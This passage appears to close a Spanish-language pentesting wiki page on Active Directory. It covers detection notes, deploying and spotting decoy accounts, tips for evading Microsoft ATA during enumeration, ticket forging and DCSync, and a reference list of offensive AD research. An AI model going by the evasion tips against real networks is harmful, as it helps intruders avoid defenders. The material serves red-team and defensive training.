- Varios de estos rasgos procedentes del mismo host/usuario/sesión/intervalo temporal son mucho más contundentes que cualquier campo débil individual
- **Úsalo como enriquecimiento, no como alertas independientes**:
- Nombres de archivo predeterminados, rutas de salida, nombres de servicios aleatorios, nombres de archivos batch temporales, nombres de cuentas de equipo predeterminados y cadenas HTTP/WebDAV/RDP/MSSQL específicas de herramientas
- Los operadores pueden cambiar estos elementos fácilmente y es mejor usarlos para explicar por qué un clúster entre protocolos resulta sospechoso
- **Notas operativas**:
- Algunas de estas señales requieren tráfico descifrado, [análisis de PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
- Valida los resultados con clientes Samba/Linux, appliances y software heredado antes de convertirlos en alertas
- Promueve las detecciones de enriquecimiento -> hunting -> alertas a medida que aumente la confianza en la línea base

### **Implementación de técnicas de deception**

- Implementar deception implica colocar trampas, como usuarios o equipos señuelo, con características como contraseñas que no caducan o que están marcadas como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos con privilegios elevados.<sup>[[2]](#references)</sup>
- Un ejemplo práctico consiste en usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Puedes encontrar más información sobre la implementación de técnicas de deception en [Deploy-Deception en GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificación de deception**

- **Para objetos de usuario**: Los indicadores sospechosos incluyen un ObjectSID atípico, inicios de sesión poco frecuentes, fechas de creación y bajos recuentos de contraseñas incorrectas.
- **Indicadores generales**: Comparar los atributos de posibles objetos señuelo con los de objetos legítimos puede revelar incoherencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar este tipo de deception.

### **Evasión de sistemas de detección**

- **Evasión de la detección de Microsoft ATA**:
- **Enumeración de usuarios**: Evitar la enumeración de sesiones en Domain Controllers para impedir la detección de ATA.
- **Suplantación mediante tickets**: Utilizar claves **aes** para crear tickets ayuda a evadir la detección al no degradar a NTLM.
- **Ataques DCSync**: Se recomienda ejecutarlos desde un equipo que no sea un Domain Controller para evitar la detección de ATA, ya que la ejecución directa desde un Domain Controller activará alertas.

## References

- [1] [Una guía para atacar relaciones de confianza de dominio](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjando relaciones de confianza para deception en Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Colección LDAP BOF – Toolkit LDAP en memoria para la explotación de Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – ¡Holy Shuck! Weaponizing hashes NTLM como wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Análisis de Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: tomando el control de cuentas de Active Directory mediante Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Cómo administrar los cambios en las conexiones de canal seguro de Netlogon asociados con CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un recorrido por las interfaces Null Session y MS-RPC olvidadas](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [¿SID filter como límite de seguridad entre dominios? (Parte 4) - Investigación sobre la evasión del filtrado SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [¿SID filter como límite de seguridad entre dominios? (Parte 5) - Ataque de confianza Golden GMSA - del hijo al padre](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [¿SID filter como límite de seguridad entre dominios? (Parte 6) - Ataque de confianza mediante cambios de esquema - del hijo al padre](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalación de los administradores del dominio hijo a administradores empresariales en 5 minutos mediante el abuso de AD CS, continuación](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE bajo la manga: diseño de backdoors DACL de Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Código fuente del módulo pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atributo msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
